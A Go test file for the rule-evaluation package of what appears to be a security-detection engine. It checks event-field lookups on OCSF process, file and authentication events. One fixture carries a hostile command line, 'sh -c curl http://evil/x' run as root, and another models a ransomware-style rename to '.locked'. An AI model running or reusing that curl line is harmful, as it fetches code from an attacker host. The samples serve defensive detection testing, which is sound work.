package ruleeval

import (
	"testing"
	"time"

	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

func TestCategoryToClassCoversPhase1(t *testing.T) {
	cases := map[ruleast.Category]ocsf.ClassID{
		ruleast.CategoryProcessCreation:   ocsf.ClassProcessActivity,
		ruleast.CategoryFileEvent:         ocsf.ClassFileSystemActivity,
		ruleast.CategoryNetworkConnection: ocsf.ClassNetworkActivity,
		ruleast.CategoryAuthentication:    ocsf.ClassAuthentication,
	}
	for cat, want := range cases {
		got, ok := CategoryToClass(cat)
		if !ok || got != want {
			t.Errorf("CategoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
		}
	}
}

func TestEnvLookupOnProcessActivity(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.ProcessActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-1"},
		ClassUID:   ocsf.ClassProcessActivity,
		ClassName:  ocsf.ClassProcessActivity.String(),
		ActivityID: ocsf.ProcessActivityLaunch,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Process: ocsf.Process{
			PID:     1234,
			Name:    "sh",
			Cmdline: "sh -c curl http://evil/x",
			File:    &ocsf.File{Path: "/bin/sh"},
			User:    &ocsf.User{Name: "root", UID: "0"},
		},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryProcessCreation))
	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 {
			t.Errorf("Lookup(%q) miss, want hit", field)
		}
	}
	if _, ok := env.Lookup("NotAField"); ok {
		t.Errorf("Lookup of unknown field should miss")
	}
}

func TestEnvLookupRenameDestinationOnFileEvent(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.FileSystemActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-r"},
		ClassUID:   ocsf.ClassFileSystemActivity,
		ClassName:  ocsf.ClassFileSystemActivity.String(),
		ActivityID: ocsf.FileActivityRename,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Actor:      ocsf.Actor{Process: ocsf.Process{PID: 4321, Name: "encryptor"}},
		File:       ocsf.File{Path: "/home/alice/report.docx", Name: "report.docx"},
		RenameTo:   &ocsf.File{Path: "/home/alice/report.docx.locked", Name: "report.docx.locked"},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryFileEvent))

	// Actor PID is the kill target for ransomware response — must resolve.
	if v, ok := env.Lookup("ProcessId"); !ok || len(v) == 0 || v[0] != "4321" {
		t.Errorf("ProcessId = %v (ok=%v), want the actor PID", v, ok)
	}

	// The source path remains on TargetFilename; the .locked suffix is
	// only reachable through RenameTo / NewFilename.
	if v, ok := env.Lookup("TargetFilename"); !ok || len(v) == 0 || v[0] != "/home/alice/report.docx" {
		t.Errorf("TargetFilename = %v (ok=%v), want the source path", v, ok)
	}
	for _, field := range []string{"RenameTo", "NewFilename"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 || v[0] != "/home/alice/report.docx.locked" {
			t.Errorf("Lookup(%q) = %v (ok=%v), want the rename destination", field, v, ok)
		}
	}

	// A non-rename event carries no RenameTo, so the field must miss.
	noRename := &ocsf.FileSystemActivity{
		ClassUID:   ocsf.ClassFileSystemActivity,
		ActivityID: ocsf.FileActivityCreate,
		File:       ocsf.File{Path: "/tmp/x", Name: "x"},
	}
	if _, ok := EnvFor(noRename, AccessorFor(ruleast.CategoryFileEvent)).Lookup("RenameTo"); ok {
		t.Errorf("RenameTo on a non-rename event should miss")
	}
}

func authFixture() *ocsf.Authentication {
	return &ocsf.Authentication{
		Metadata:     ocsf.Metadata{EventCode: "auth_attempt"},
		ClassUID:     ocsf.ClassAuthentication,
		ActivityID:   ocsf.AuthActivityLogon,
		Time:         1,
		User:         ocsf.User{Name: "alice"},
		Status:       "Failure",
		StatusID:     2,
		StatusCode:   "7",
		StatusDetail: "PAM_AUTH_ERR",
		LogonType:    "Remote Interactive",
		Service:      &ocsf.Service{Name: "sshd"},
		SrcEndpoint:  &ocsf.NetEndpoint{IP: "203.0.113.9"},
		TTY:          "ssh",
		Actor: ocsf.Actor{
			Process: ocsf.Process{PID: 900, Name: "sshd", Cmdline: "sshd: alice [priv]", File: &ocsf.File{Path: "/usr/sbin/sshd"}},
			User:    ocsf.User{Name: "root"},
		},
	}
}

// TestEnvLookupOnAuthentication pins the asymmetry that matters for auth
// rules: `User` is the account being authenticated, the actor daemon's
// user is `SubjectUserName`, and the PAM result is reachable three ways.
func TestEnvLookupOnAuthentication(t *testing.T) {
	env := EnvFor(authFixture(), AccessorFor(ruleast.CategoryAuthentication))
	want := map[string]string{
		"User":            "alice",
		"TargetUserName":  "alice",
		"SubjectUserName": "root",
		"Service":         "sshd",
		"EventCode":       "auth_attempt",
		"Status":          "Failure",
		"StatusCode":      "7",
		"StatusDetail":    "PAM_AUTH_ERR",
		"SourceIp":        "203.0.113.9",
		"RemoteHost":      "203.0.113.9",
		"LogonType":       "Remote Interactive",
		"Tty":             "ssh",
		"Image":           "/usr/sbin/sshd",
		"CommandLine":     "sshd: alice [priv]",
		"ProcessId":       "900",
	}
	for field, w := range want {
		got, ok := env.Lookup(field)
		if !ok || len(got) != 1 || got[0] != w {
			t.Errorf("Lookup(%q) = %v, %v; want [%q]", field, got, ok, w)
		}
	}
	if _, ok := env.Lookup("SourceHostname"); ok {
		t.Error("SourceHostname must be absent when rhost was an IP")
	}
}

func TestEnvLookupAuthRemoteHostFallsBackToHostname(t *testing.T) {
	ev := authFixture()
	ev.SrcEndpoint = &ocsf.NetEndpoint{Hostname: "bastion"}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryAuthentication))
	if got, ok := env.Lookup("RemoteHost"); !ok || got[0] != "bastion" {
		t.Errorf("RemoteHost = %v, %v", got, ok)
	}
	if _, ok := env.Lookup("SourceIp"); ok {
		t.Error("SourceIp must be absent when rhost was a name")
	}
	ev.SrcEndpoint = nil
	env = EnvFor(ev, AccessorFor(ruleast.CategoryAuthentication))
	if _, ok := env.Lookup("RemoteHost"); ok {
		t.Error("RemoteHost must be absent for a local client")
	}
}
